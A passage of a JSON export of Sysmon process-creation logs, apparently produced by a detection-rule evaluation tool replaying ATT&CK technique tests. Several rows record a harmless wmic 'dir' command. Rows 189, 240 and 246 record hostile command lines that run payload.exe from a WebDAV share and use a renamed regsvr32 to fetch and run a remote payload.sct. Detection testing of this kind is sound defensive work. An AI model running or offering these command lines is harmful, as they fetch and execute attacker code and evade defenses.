      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1018__t1018_046.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-F0A4-6A2E-D119-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T18:19:16.309379Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 18:19:16.303",
      "Version": 5
    },
    {
      "row_id": 55,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "wmic  /node:localhost process call create 'cmd.exe /c dir C:\\'",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "WMI Commandline Utility",
      "EventID": 1,
      "EventRecordID": 213757,
      "FileVersion": "10.0.26100.5074 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=2E51DA7B69836CFEBCB3F9AA47C08266,SHA256=7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690,IMPHASH=43C6BE584D77B658A53A9A5C606724DD",
      "IMPHASH": "43C6BE584D77B658A53A9A5C606724DD",
      "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "2E51DA7B69836CFEBCB3F9AA47C08266",
      "Opcode": 0,
      "OriginalFileName": "wmic.exe",
      "OriginalLogfile": "t1018__t1018_046.evtx",
      "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe /c \"wmic /node:localhost process call create 'cmd.exe /c dir C:\\'\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-F0A4-6A2E-D119-000000002C00",
      "ParentProcessId": 6608,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-F0A4-6A2E-D219-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690",
      "SystemTime": "2026-06-14T18:19:16.326580Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 18:19:16.323",
      "Version": 5
    },
    {
      "row_id": 56,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "C:\\Windows\\System32\\cmd.exe /C \"wmic /node:localhost process call create 'cmd.exe /c dir C:\\'\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 213808,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1018__t1018_047.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-F0BB-6A2E-EA19-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T18:19:39.214082Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 18:19:39.210",
      "Version": 5
    },
    {
      "row_id": 57,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "wmic  /node:localhost process call create 'cmd.exe /c dir C:\\'",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "WMI Commandline Utility",
      "EventID": 1,
      "EventRecordID": 213809,
      "FileVersion": "10.0.26100.5074 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=2E51DA7B69836CFEBCB3F9AA47C08266,SHA256=7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690,IMPHASH=43C6BE584D77B658A53A9A5C606724DD",
      "IMPHASH": "43C6BE584D77B658A53A9A5C606724DD",
      "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "2E51DA7B69836CFEBCB3F9AA47C08266",
      "Opcode": 0,
      "OriginalFileName": "wmic.exe",
      "OriginalLogfile": "t1018__t1018_047.evtx",
      "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe /C \"wmic /node:localhost process call create 'cmd.exe /c dir C:\\'\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-F0BB-6A2E-EA19-000000002C00",
      "ParentProcessId": 3212,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-F0BB-6A2E-EB19-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690",
      "SystemTime": "2026-06-14T18:19:39.235865Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 18:19:39.232",
      "Version": 5
    },
    {
      "row_id": 67,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "C:\\Windows\\System32\\cmd.exe /c \"wmic /node:localhost process call create 'cmd.exe /c dir C:\\'\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 214340,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1018__t1018_092.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-F267-6A2E-E91A-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T18:26:47.567136Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 18:26:47.563",
      "Version": 5
    },
    {
      "row_id": 68,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "wmic  /node:localhost process call create 'cmd.exe /c dir C:\\'",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "WMI Commandline Utility",
      "EventID": 1,
      "EventRecordID": 214341,
      "FileVersion": "10.0.26100.5074 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=2E51DA7B69836CFEBCB3F9AA47C08266,SHA256=7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690,IMPHASH=43C6BE584D77B658A53A9A5C606724DD",
      "IMPHASH": "43C6BE584D77B658A53A9A5C606724DD",
      "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "2E51DA7B69836CFEBCB3F9AA47C08266",
      "Opcode": 0,
      "OriginalFileName": "wmic.exe",
      "OriginalLogfile": "t1018__t1018_092.evtx",
      "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe /c \"wmic /node:localhost process call create 'cmd.exe /c dir C:\\'\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-F267-6A2E-E91A-000000002C00",
      "ParentProcessId": 11152,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-F267-6A2E-EA1A-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690",
      "SystemTime": "2026-06-14T18:26:47.583477Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 18:26:47.580",
      "Version": 5
    },
    {
      "row_id": 69,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "C:\\Windows\\System32\\cmd.exe /C \"wmic /node:localhost process call create 'cmd.exe /c dir C:\\'\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 214360,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1018__t1018_093.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-F277-6A2E-F31A-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T18:27:03.747030Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 18:27:03.742",
      "Version": 5
    },
    {
      "row_id": 70,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "wmic  /node:localhost process call create 'cmd.exe /c dir C:\\'",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "WMI Commandline Utility",
      "EventID": 1,
      "EventRecordID": 214361,
      "FileVersion": "10.0.26100.5074 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=2E51DA7B69836CFEBCB3F9AA47C08266,SHA256=7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690,IMPHASH=43C6BE584D77B658A53A9A5C606724DD",
      "IMPHASH": "43C6BE584D77B658A53A9A5C606724DD",
      "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "2E51DA7B69836CFEBCB3F9AA47C08266",
      "Opcode": 0,
      "OriginalFileName": "wmic.exe",
      "OriginalLogfile": "t1018__t1018_093.evtx",
      "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe /C \"wmic /node:localhost process call create 'cmd.exe /c dir C:\\'\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-F277-6A2E-F31A-000000002C00",
      "ParentProcessId": 8904,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-F277-6A2E-F41A-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690",
      "SystemTime": "2026-06-14T18:27:03.767104Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 18:27:03.763",
      "Version": 5
    },
    {
      "row_id": 189,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /c \"wmic.exe process call create \\\"\\\\192.168.1.50\\DavWWWRoot\\share\\payload.exe\\\"\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 207458,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1059.001__t1059.001_475.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E0F6-6A2E-860D-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T17:12:22.545711Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:12:22.539",
      "Version": 5
    },
    {
      "row_id": 240,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /c \"wmic.exe process call create \\\"\\\\192.168.1.50\\DavWWWRoot\\share\\payload.exe\\\"\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 209016,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1114__t1114_019.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E506-6A2E-8F10-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T17:29:42.793412Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:29:42.723",
      "Version": 5
    },
    {
      "row_id": 246,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /c copy C:\\Windows\\System32\\regsvr32.exe %%TEMP%%\\updater.exe && wmic process call create \"%%TEMP%%\\updater.exe /s /i:http://10.0.0.5/payload.sct scrobj.dll\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 209159,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1114__t1114_022.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E558-6A2E-D610-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T17:31:05.002967Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:31:04.997",
      "Version": 5
    },
